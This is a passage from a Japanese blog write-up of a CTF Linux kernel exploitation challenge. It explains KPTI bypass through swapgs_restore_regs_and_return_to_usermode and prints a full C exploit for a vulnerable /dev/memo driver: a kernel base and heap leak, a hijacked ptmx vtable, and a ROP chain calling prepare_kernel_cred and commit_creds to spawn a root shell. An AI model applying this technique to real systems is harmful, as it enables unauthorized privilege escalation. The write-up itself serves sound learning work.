+<p>daemon が NULL であった場合には以下の分岐に於いて init_cred の cred を返すことになる</p>
+<pre class="prettyprint linenums">	if (daemon)
+		old = get_task_cred(daemon);
+	else
+		old = get_cred(&amp;init_cred);
+</pre>
+<p> </p>
+<p>この cred は init に指される credential のため、これを現在実行中のプロセスに適用させることで root 権限を得ることができる</p>
+<p> </p>
+<h5>init_cred を適用させる</h5>
+<p>この cred を現在のプロセスに適用させるのが int commit_creds(struct task *new) である</p>
+<p><a href="https://elixir.bootlin.com/linux/latest/source/kernel/cred.c#L434">https://elixir.bootlin.com/linux/latest/source/kernel/cred.c#L434</a></p>
+<p> </p>
+<p>尚、これを呼ぶ前に prepare_kernel_cred() の返り値を rdi に移しておく必要がある</p>
+<p> </p>
+<h5>userlandへの帰還</h5>
+<p>これで無事特権を入手したため、あとは userland に帰って用意しておいたシェルをポップする関数を呼ぶだけである</p>
+<p>但し前述したように KPTI 有効であるから単純に帰るだけではセグフォが起きる</p>
+<p>前もって決められた手順に従わなくてはならない (or CR3, 0x1000)</p>
+<p>これをしてくれるのが以下の<strong style="font-weight: bolder; color: #454545; font-family: 'Noto Sans Japanese', 游ゴシック体, 'Yu Gothic', YuGothic, 'ヒラギノ角ゴシック Pro', 'Hiragino Kaku Gothic Pro', メイリオ, Meiryo, Osaka, 'ＭＳ Ｐゴシック', 'MS PGothic', sans-serif; font-size: medium; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: #ffffff; text-decoration-style: initial; text-decoration-color: initial;">swapgs_restore_regs_and_return_to_usermode </strong>マクロである</p>
+<pre class="prettyprint linenums">GLOBAL(swapgs_restore_regs_and_return_to_usermode)
+#ifdef CONFIG_DEBUG_ENTRY
+	/* Assert that pt_regs indicates user mode. */
+	testb	$3, CS(%rsp)
+	jnz	1f
+	ud2
+1:
+#endif
+	POP_REGS pop_rdi=0
+ 
+	/*
+	 * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.
+	 * Save old stack pointer and switch to trampoline stack.
+	 */
+	movq	%rsp, %rdi
+	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp
+ 
+	/* Copy the IRET frame to the trampoline stack. */
+	pushq	6*8(%rdi)	/* SS */
+	pushq	5*8(%rdi)	/* RSP */
+	pushq	4*8(%rdi)	/* EFLAGS */
+	pushq	3*8(%rdi)	/* CS */
+	pushq	2*8(%rdi)	/* RIP */
+ 
+	/* Push user RDI on the trampoline stack. */
+	pushq	(%rdi)
+ 
+	/*
+	 * We are on the trampoline stack.  All regs except RDI are live.
+	 * We can do future final exit work right here.
+	 */
+ 
+	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi
+ 
+	/* Restore RDI. */
+	popq	%rdi
+	SWAPGS
+	INTERRUPT_RETURN</pre>
+<p> </p>
+<p> これを呼ぶことで、kernel land から user land に帰ることができるのだが、その際にスタック上に保存しておいた非特権モード時のレジスタの値を置いておく必要がある</p>
+<p>そこで、以前のエントリでも使用したコードを使い予めexploitプログラム上でレジスタの値を記憶しておくことにする</p>
+<p><iframe class="embed-card embed-blogcard" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;" title="【pwn 10.0】 gnote (kernel exploitation) - TokyoWesternsCTF2019 - newbieからバイナリアンへ" src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsmallkirby.hatenablog.com%2Fentry%2F2019%2F11%2F19%2F225504" frameborder="0" scrolling="no"></iframe><cite class="hatena-citation"><a href="https://smallkirby.hatenablog.com/entry/2019/11/19/225504">smallkirby.hatenablog.com</a></cite></p>
+<pre class="prettyprint linenums">static void save_state(void) {
+  asm(
+      "movq %%cs, %0\n"
+      "movq %%ss, %1\n"
+      "pushfq\n"
+      "popq %2\n"
+      : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory" 		);
+}
+</pre>
+<p> </p>
+<p> </p>
+<h3> 6. exploit</h3>
+<p> ということで、ROPを組んで出来上がったコードが以下の通り</p>
+<p>尚コレは配布 kernel ではなく自前ビルドした kernel 上でのみ動作する</p>
+<p>KASLR等の有効設定は全て配布設定のままである</p>
+<pre class="prettyprint linenums">#include&lt;stdio.h&gt;<stdio.h>
+#include&lt;stdlib.h&gt;<stdlib.h>
+#include&lt;fcntl.h&gt;<fcntl.h>
+#include&lt;unistd.h&gt;<unistd.h>
+#include&lt;sys/ioctl.h&gt;
+#include&lt;sys/types.h&gt;
+
+#define ulong unsigned long
+
+ulong user_cs,user_ss,user_sp,user_rflags;
+
+void pop_shell(void)
+{
+  char *argv[] = {"/bin/sh",NULL};
+  char *envp[] = {NULL};
+  execve("/bin/sh",argv,envp);
+}
+
+static void save_state(void) {
+  asm(
+      "movq %%cs, %0\n"
+      "movq %%ss, %1\n"
+      "movq %%rsp, %2\n"
+      "pushfq\n"
+      "popq %3\n"
+      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
+}
+
+int main(void)
+{
+  int memo = open("/dev/memo",O_RDWR);
+  int ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
+  char buf[0x400];
+  ulong *rop;
+  ulong kernbase, kernheap;
+
+  /**** gadgets ****/
+  ulong off_ptm_unix98_ops_kernbase = 0x6191e0;
+  ulong off_kernheap = 0x438;
+  // 0xffffffff810243b8: push rdx ; pop rsp ; sub eax, 0x0002E5AC ; pop rax ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret  ;  (1 found)
+  ulong gad1 = 0x243b8;
+  // 0xffffffff810e7ae8: pop rdi ; ret  ;  (47 found)
+  ulong pop_rdi = 0xe7ae8;
+  // 0xffffffff8100fc8e: mov rdi, rax ; rep movsq  ; ret  ;  (1 found)
+  ulong mov_rdi_rax = 0xfc8e;
+  // 0xffffffff810fb892: pop rcx ; add cl, byte [rax-0x7D] ; ret  ;  (2 found)
+  ulong pop_rcx = 0xfb892;
+  ulong prepare_kernel_cred = 0x44850;
+  ulong commit_creds = 0x44680;
+  /*
+   0xffffffff812009c4 &lt;+68&gt;:    mov    rdi,rsp
+   0xffffffff812009c7 &lt;+71&gt;:    mov    rsp,QWORD PTR ds:0xffffffff81806004
+   0xffffffff812009cf &lt;+79&gt;:    push   QWORD PTR [rdi+0x30]
+   0xffffffff812009d2 &lt;+82&gt;:    push   QWORD PTR [rdi+0x28]
+   0xffffffff812009d5 &lt;+85&gt;:    push   QWORD PTR [rdi+0x20]
+   0xffffffff812009d8 &lt;+88&gt;:    push   QWORD PTR [rdi+0x18]
+   0xffffffff812009db &lt;+91&gt;:    push   QWORD PTR [rdi+0x10]
+   0xffffffff812009de &lt;+94&gt;:    push   QWORD PTR [rdi]
+   0xffffffff812009e0 &lt;+96&gt;:    push   rax
+   0xffffffff812009e1 &lt;+97&gt;:    xchg   ax,ax
+   0xffffffff812009e3 &lt;+99&gt;:    mov    rdi,cr3
+   0xffffffff812009e6 &lt;+102&gt;:   jmp    0xffffffff81200a1a &lt;common_interrupt+154&gt;
+   0xffffffff812009e8 &lt;+104&gt;:   mov    rax,rdi
+   0xffffffff812009eb &lt;+107&gt;:   and    rdi,0x7ff
+
+  */
+  ulong swapgs_restore_regs_and_return_to_usermode = 0x2009c4;
+
+
+  // 状態の保存
+  save_state();
+
+  lseek(memo,0x300,SEEK_SET);
+  read(memo,buf,0x400);
+
+  // leak kernbase and kernheap
+  kernbase = *(unsigned long*)(buf + 0x100 + 0x18) - off_ptm_unix98_ops_kernbase;
+  printf("kernbase: %lx\n",kernbase);
+  kernheap = *(unsigned long*)(buf + 0x100 + 0x38) - off_kernheap;
+  printf("kernheap: %lx\n",kernheap);
+
+  // vtableへのポインタの書き換え
+  *(unsigned long*)(buf + 0xc*8) = kernbase + gad1; // fake ioctl entry
+  *(unsigned long*)(buf + 0x100 + 0x18) = kernheap + 0x300; // fake vtable pointer
+
+  lseek(memo,0x300,SEEK_SET);
+  write(memo,buf,0x400); // overwrite ops and ioctl entry
+
+  // ROP chain
+  rop = (unsigned long*)buf;
+  // gad1のごまかし*6
+  *rop++ = 0x0;
+  *rop++ = 0x0;
+  *rop++ = 0x0;
+  *rop++ = 0x0;
+  *rop++ = 0x0;
+  *rop++ = 0x0;
+
+  // init_task の cred を入手
+  *rop++ = kernbase + pop_rdi;
+  *rop++ = 0;
+  *rop++ = kernbase + prepare_kernel_cred;
+
+  // 入手したcredを引数にしてcommit
+  *rop++ = kernbase + pop_rcx;      // mov_rdi_raxガジェットがrepを含んでいるため、カウンタ0にしておく
+  *rop++ = 0;
+  *rop++ = kernbase + mov_rdi_rax;
+  *rop++ = kernbase + commit_creds;
+
+  // return to usermode by swapgs_restore_regs_and_return_to_usermode
+  *rop++ = kernbase + swapgs_restore_regs_and_return_to_usermode;
+  *rop++ = 0;
+  *rop++ = 0;
+  *rop++ = (ulong)&amp;pop_shell;
+  *rop++ = user_cs;
+  *rop++ = user_rflags;
+  *rop++ = user_sp;
+  *rop++ = user_ss;
+
+  // invoke shell
+  lseek(memo,0x0,SEEK_SET);
+  write(memo,buf,0x100);
+  ioctl(ptmx,kernheap,kernheap);
+
+  return 0;
+}
+</unistd.h></fcntl.h></stdlib.h></stdio.h></pre>
+<p> </p>
+<p> これを実行すると、以下のように確かにLPEできていることがわかる</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="pwned">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20200723/20200723221010.png" alt="f:id:smallkirby:20200723221010p:plain" title="f:id:smallkirby:20200723221010p:plain" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">pwned</figcaption>
+</figure>
+<p> </p>
+<p> </p>
+<p> </p>
+<h3>7. アウトロ</h3>
+<p>KPTI と KDDI って、似てるよね</p>
+<p>親戚なんかな</p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p>続く...</p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
